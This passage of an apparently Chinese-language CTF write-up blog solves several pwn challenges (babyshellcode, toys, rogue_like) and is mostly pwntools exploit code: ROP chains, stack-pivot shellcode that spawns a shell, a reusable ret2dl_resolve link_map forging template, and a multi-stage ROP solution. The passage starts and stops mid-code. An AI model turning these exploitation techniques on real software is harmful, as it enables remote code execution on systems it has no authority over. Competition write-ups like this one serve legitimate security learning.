class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000402734</span>) <span class="hljs-comment"># syscall</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&quot;</span> , <span class="hljs-built_in">len</span>(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x108</span>+p64(canary)+p64(<span class="hljs-number">0</span>)+p))<br>payload2=<span class="hljs-string">b&#x27;&#x27;&#x27;POST /add HTTP/1.1\r</span><br><span class="hljs-string">Host: www.baidu.com\r</span><br><span class="hljs-string">User-Agent: Haha\r</span><br><span class="hljs-string">Content-Length: 1192\r</span><br><span class="hljs-string">Content: &#x27;&#x27;&#x27;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x108</span>+p64(canary)+p64(<span class="hljs-number">0</span>)+p+<span class="hljs-string">b&#x27;\r\n&#x27;</span><br>io.send(payload2)<br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="babyshellcode"><a href="#babyshellcode" class="headerlink" title="babyshellcode"></a>babyshellcode</h2><p>利用第一次shellcode<strong>栈迁移</strong>，再通过rop链调用syscall执行read，最后重新执行shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#! /usr/bin/python</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br>e = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br>shellcode = <span class="hljs-string">&quot;&quot;&quot;mov esp, esi</span><br><span class="hljs-string">ret</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>shellcode = asm(shellcode)<br>sh = asm(shellcraft.sh())<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(shellcode))<br><br><span class="hljs-comment"># io = process(&quot;./pwn&quot;)</span><br><span class="hljs-comment"># io = gdb.debug(&quot;./pwn&quot;, &quot;&quot;&quot;b main</span><br><span class="hljs-comment">#                b *(*shellcode+128)</span><br><span class="hljs-comment">#                b *(*shellcode+143)</span><br><span class="hljs-comment">#                &quot;&quot;&quot;)</span><br><br>pop_rdi_rsi = p64(<span class="hljs-number">0x4013c9</span>)<br>syscall = p64(<span class="hljs-number">0x401332</span>)<br>mv_ecx_edx = p64(<span class="hljs-number">0x4012b1</span>)<br><br><br><br>io = remote(<span class="hljs-string">&quot;59.110.162.87&quot;</span>, <span class="hljs-number">28725</span>)<br>io.recvuntil(<span class="hljs-string">b&quot;gift: &quot;</span>)<br>buf = <span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">b&quot;.&quot;</span>)[<span class="hljs-number">2</span>:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br>log.success(<span class="hljs-string">f&quot;buf: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(buf)&#125;</span>&quot;</span>)<br>rop_chain =  pop_rdi_rsi + p64(<span class="hljs-number">0</span>) + p64(buf) + mv_ecx_edx + syscall + p64(buf)<br>io.sendafter(<span class="hljs-string">b&quot;&gt; &quot;</span>, rop_chain)<br>io.sendafter(<span class="hljs-string">b&quot;&gt; &quot;</span>, shellcode)<br>pause()<br>io.send(sh)<br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="riya"><a href="#riya" class="headerlink" title="riya"></a>riya</h2><p>输入n直接给shell……不是，哥们？</p><h2 id="toys"><a href="#toys" class="headerlink" title="toys"></a>toys</h2><p>官方题解需要多次栈迁移，非常麻烦，令人头大。但这题有个非预期解:<code>ret2dl</code>，套板子即可。参考<a href="http://39.104.51.85/index.php/2025/01/26/%e6%98%a5%e7%a7%8b%e6%9d%af%e5%86%ac%e5%ad%a3%e8%b5%9bday3-toys%e9%9d%9e%e9%a2%84%e6%9c%9f%e8%a7%a3/">春秋杯冬季赛day3 pwn toys非预期解 – 博的blog</a><br>板子是这样的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-comment"># ret2dl板子</span><br><span class="hljs-comment"># 传参分别为：伪造的link_map地址、在got表中存在函数地址的got地址、libc中system的地址、第二个参数对应的函数在libc中的偏移</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_ret2dl_data</span>(<span class="hljs-params">fake_link_map_addr, got_solved_addr, system_base, solved_base</span>):<br>    offset = system_base - solved_base<br> <br>    fake_Elf64_Dyn = <span class="hljs-string">b&quot;&quot;</span><br>    fake_Elf64_Dyn += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># d_tag  从link_map中找.rel.plt不需要用到标签， 随意设置</span><br>    fake_Elf64_Dyn += p64(fake_link_map_addr + <span class="hljs-number">0x18</span>)  <span class="hljs-comment"># d_ptr  指向伪造的Elf64_Rela结构体，由于reloc_offset也被控制为0，不需要伪造多个结构体</span><br> <br>    fake_Elf64_Rela = <span class="hljs-string">b&quot;&quot;</span><br>    fake_Elf64_Rela += p64(<br>        fake_link_map_addr - offset)  <span class="hljs-comment"># r_offset rel_addr = l-&gt;addr+reloc_offset，</span><br>    <span class="hljs-comment"># 直接指向fake_link_map所在位置令其可读写就行，offset为指向的需要的函数距离可得真实地址的函数的偏移</span><br>    fake_Elf64_Rela += p64(<span class="hljs-number">7</span>)  <span class="hljs-comment"># r_info index设置为0，最后一字节必须为7</span><br>    fake_Elf64_Rela += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># r_addend  随意设置</span><br> <br>    fake_Elf64_Sym = <span class="hljs-string">b&quot;&quot;</span><br>    fake_Elf64_Sym += p32(<span class="hljs-number">0</span>)  <span class="hljs-comment"># st_name 随意设置</span><br>    fake_Elf64_Sym += <span class="hljs-string">b&#x27;AAAA&#x27;</span>  <span class="hljs-comment"># st_info, st_other, st_shndx st_other非0以避免进入重定位符号的分支</span><br>    fake_Elf64_Sym += p64(got_solved_addr - <span class="hljs-number">8</span>)  <span class="hljs-comment"># st_value 已解析函数的got表地址-8，-8体现在汇编代码中，原因不明</span><br>    fake_Elf64_Sym += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># st_size 随意设置</span><br> <br>    fake_link_map_data = <span class="hljs-string">b&quot;&quot;</span><br>    <span class="hljs-comment"># 如果offset为负数使用补码</span><br>    <span class="hljs-keyword">if</span> offset &lt; <span class="hljs-number">0</span>:<br>        fake_link_map_data += p64(<span class="hljs-number">2</span> ** <span class="hljs-number">64</span> + offset)  <span class="hljs-comment"># l_addr，伪造为两个函数的地址偏移值的补码（为负时）</span><br>    <span class="hljs-keyword">else</span>:<br>        fake_link_map_data += p64(offset)  <span class="hljs-comment"># l_addr，伪造为两个函数的地址偏移值</span><br> <br>    fake_link_map_data += fake_Elf64_Dyn<br>    fake_link_map_data += fake_Elf64_Rela<br>    fake_link_map_data += fake_Elf64_Sym<br>    fake_link_map_data += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x20</span><br>    fake_link_map_data += p64(fake_link_map_addr)  <span class="hljs-comment"># DT_STRTAB 设置为一个可读的地址</span><br>    fake_link_map_data += p64(fake_link_map_addr + <span class="hljs-number">0x30</span>)  <span class="hljs-comment"># DT_SYMTAB 指向对应结构体数组的地址</span><br>    fake_link_map_data += <span class="hljs-string">b&quot;/bin/sh\x00&quot;</span><br>    fake_link_map_data += <span class="hljs-string">b&#x27;\x01&#x27;</span> * <span class="hljs-number">0x78</span><br>    fake_link_map_data += p64(fake_link_map_addr + <span class="hljs-number">0x8</span>)  <span class="hljs-comment"># DT_JMPREL 指向对应数组结构体的地址</span><br> <br>    <span class="hljs-keyword">return</span> fake_link_map_data<br>ret2dldata=get_ret2dl_data(fake_link_map_addr,elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>],onegadget[<span class="hljs-number">3</span>],libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>])<br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*?+p64(rbp)+p64(jmp_dl)+p64(fake_link_map_addr)+p64(<span class="hljs-number">0</span>)+ret2dldata<br></code></pre></td></tr></table></figure><p>这是题解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>] <br>p = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-comment"># p = gdb.debug(&quot;./pwn&quot;, &quot;&quot;&quot;b main</span><br><span class="hljs-comment">#               b *(0x401251)</span><br><span class="hljs-comment">#               &quot;&quot;&quot;)</span><br>elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><span class="hljs-comment"># 传参分别为：伪造的link_map地址、在got表中存在函数地址的got地址、libc中system的地址、第二个参数对应的函数在libc中的地址</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_ret2dl_data</span>(<span class="hljs-params">fake_link_map_addr, got_solved_addr, system_base, solved_base</span>):<br>    offset = system_base - solved_base<br> <br>    fake_Elf64_Dyn = <span class="hljs-string">b&quot;&quot;</span><br>    fake_Elf64_Dyn += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># d_tag  从link_map中找.rel.plt不需要用到标签， 随意设置</span><br>    fake_Elf64_Dyn += p64(fake_link_map_addr + <span class="hljs-number">0x18</span>)  <span class="hljs-comment"># d_ptr  指向伪造的Elf64_Rela结构体，由于reloc_offset也被控制为0，不需要伪造多个结构体</span><br> <br>    fake_Elf64_Rela = <span class="hljs-string">b&quot;&quot;</span><br>    fake_Elf64_Rela += p64(fake_link_map_addr - offset)  <span class="hljs-comment"># r_offset rel_addr = l-&gt;addr+reloc_offset，</span><br>    <span class="hljs-comment"># 直接指向fake_link_map所在位置令其可读写就行，offset为指向的需要的函数距离可得真实地址的函数的偏移</span><br>    fake_Elf64_Rela += p64(<span class="hljs-number">7</span>)  <span class="hljs-comment"># r_info index设置为0，最后一字节必须为7</span><br>    fake_Elf64_Rela += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># r_addend  随意设置</span><br> <br>    fake_Elf64_Sym = <span class="hljs-string">b&quot;&quot;</span><br>    fake_Elf64_Sym += p32(<span class="hljs-number">0</span>)  <span class="hljs-comment"># st_name 随意设置</span><br>    fake_Elf64_Sym += <span class="hljs-string">b&#x27;AAAA&#x27;</span>  <span class="hljs-comment"># st_info, st_other, st_shndx st_other非0以避免进入重定位符号的分支</span><br>    fake_Elf64_Sym += p64(got_solved_addr - <span class="hljs-number">8</span>)  <span class="hljs-comment"># st_value 已解析函数的got表地址-8，-8体现在汇编代码中，原因不明</span><br>    fake_Elf64_Sym += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># st_size 随意设置</span><br> <br>    fake_link_map_data = <span class="hljs-string">b&quot;&quot;</span><br>    <span class="hljs-comment"># 如果offset为负数使用补码</span><br>    <span class="hljs-keyword">if</span> offset &lt; <span class="hljs-number">0</span>:<br>        fake_link_map_data += p64(<span class="hljs-number">2</span> ** <span class="hljs-number">64</span> + offset)  <span class="hljs-comment"># l_addr，伪造为两个函数的地址偏移值的补码（为负时）</span><br>    <span class="hljs-keyword">else</span>:<br>        fake_link_map_data += p64(offset)  <span class="hljs-comment"># l_addr，伪造为两个函数的地址偏移值</span><br> <br>    fake_link_map_data += fake_Elf64_Dyn<br>    fake_link_map_data += fake_Elf64_Rela<br>    fake_link_map_data += fake_Elf64_Sym<br>    fake_link_map_data += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x20</span><br>    fake_link_map_data += p64(fake_link_map_addr)  <span class="hljs-comment"># DT_STRTAB 设置为一个可读的地址</span><br>    fake_link_map_data += p64(fake_link_map_addr + <span class="hljs-number">0x30</span>)  <span class="hljs-comment"># DT_SYMTAB 指向对应结构体数组的地址</span><br>    fake_link_map_data += <span class="hljs-string">b&quot;/bin/sh\x00&quot;</span><br>    fake_link_map_data += <span class="hljs-string">b&#x27;\x01&#x27;</span> * <span class="hljs-number">0x78</span><br>    fake_link_map_data += p64(fake_link_map_addr + <span class="hljs-number">0x8</span>)  <span class="hljs-comment"># DT_JMPREL 指向对应数组结构体的地址</span><br> <br>    <span class="hljs-keyword">return</span> fake_link_map_data<br>payload1=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x80</span>+p64(<span class="hljs-number">0x404500</span>+<span class="hljs-number">0x80</span>)+p64(<span class="hljs-number">0x0000000000401251</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Data: &#x27;</span>,payload1)<br>fake_link_map_addr=<span class="hljs-number">0x4045a0</span><br>jmp_dl=<span class="hljs-number">0x401026</span><br>leave_ret=<span class="hljs-number">0x00000000004012cd</span><br>onegadget=[<span class="hljs-number">0x583dc</span>,<span class="hljs-number">0x583e3</span>,<span class="hljs-number">0xef4ce</span>,<span class="hljs-number">0xef52b</span>]<br>ret2dldata=get_ret2dl_data(fake_link_map_addr,elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>],onegadget[<span class="hljs-number">3</span>],libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>payload2=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x80</span>+p64(<span class="hljs-number">0x404500</span>)+p64(jmp_dl)+p64(fake_link_map_addr)+p64(<span class="hljs-number">0</span>)+ret2dldata<br><span class="hljs-comment"># p.debug()</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;Data: &#x27;</span>,payload2)<br> <br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="rogue-like"><a href="#rogue-like" class="headerlink" title="rogue_like"></a>rogue_like</h2><p><strong>本题必须搭建远程环境才能复现(原因见下文)，可以简单地patchelf后用socat转发端口，也可以使用docker(环境:Ubuntu 18.04)</strong><br>这题大体思路是利用三次肉鸽，步骤为把tls上的canary置0-&gt;alarm got表+5(借此获取syscall的gadget)-&gt;off by null进行栈迁移+ROP。看过官方wp后应该不难理解这个大体思路。此题难点主要是这些：</p><ol><li>tls段上的canary的地址难以获得。这里可以在调试时使用<code>tls</code>指令查看，依次把tls段上的所有数据都读一遍，和<code>canary</code>值一致的就是canary的地址。</li><li>栈迁移随机性太高。这里可以将ROP链前面填满<code>ret</code>，这样成功率就会大大增加。</li><li>syscall的<code>rax</code>难以控制。但由于第二次读取时，read函数会返回读取的字符数，我们就可以利用这次read控制rax</li><li>在第三关时，程序的标准错误流和标准输出流都会被关闭，导致程序无回显。此处可以利用<code>exec 1&gt;&amp;0</code>命令，将stdout重定向到stdin，由于stdin中的内容实际上会对我们显示(shell的回显机制，你的输入会被显示到屏幕上。个别输入比如sudo的密码不会回显)，所以shell实际上会恢复正常。注意，这里只有通过远程才能实现。本地这样做是行不通的，这有可能是因为stdin只读、重定向导致冲突等原因。<strong>这也是大多数题解本地复现失败的原因之一</strong>。<br>题解如下：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    author: GeekCmore</span><br><span class="hljs-string">    time: 2025-02-24 19:18:38</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>filename = <span class="hljs-string">&quot;pwn1&quot;</span><br>libcname = <span class="hljs-string">&quot;./libc-2.27.so&quot;</span><br>host = <span class="hljs-string">&quot;localhost&quot;</span><br>port = <span class="hljs-number">11451</span><br>elf = context.binary = ELF(filename)<br><span class="hljs-keyword">if</span> libcname:<br>    libc = ELF(libcname)<br>gs = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>():<br>    <span class="hljs-keyword">if</span> args.P:<br>        <span class="hljs-keyword">return</span> process(elf.path)<br>    <span class="hljs-keyword">elif</span> args.REMOTE:<br>        <span class="hljs-keyword">return</span> remote(host, port)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> gdb.debug(elf.path, gdbscript = gs)<br><br>io = start()<br><br><br>io.sendafter(<span class="hljs-string">b&quot;&gt; &quot;</span>, <span class="hljs-string">b&quot;1&quot;</span>)<br>io.sendafter(<span class="hljs-string">b&quot;Sword!\n&quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0x25a8</span>).encode())<br><br>io.sendafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>io.sendafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">5</span>).encode())<br>io.sendafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0x602058</span>).encode())<br><br>io.sendafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>pop_rdi = <span class="hljs-number">0x4013f4</span><br>bin_sh = <span class="hljs-number">0x4019d7</span><br>ret = <span class="hljs-number">0x4007fe</span><br>pop_rsi = <span class="hljs-number">0x4013f6</span><br>pop_rdx = <span class="hljs-number">0x4013f8</span><br>pop_rsp = <span class="hljs-number">0x4013fa</span><br>payload1 = p64(ret)*(<span class="hljs-number">0x16</span>) + p64(pop_rdi) + p64(bin_sh) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0</span>) + p64(pop_rsp) + p64(<span 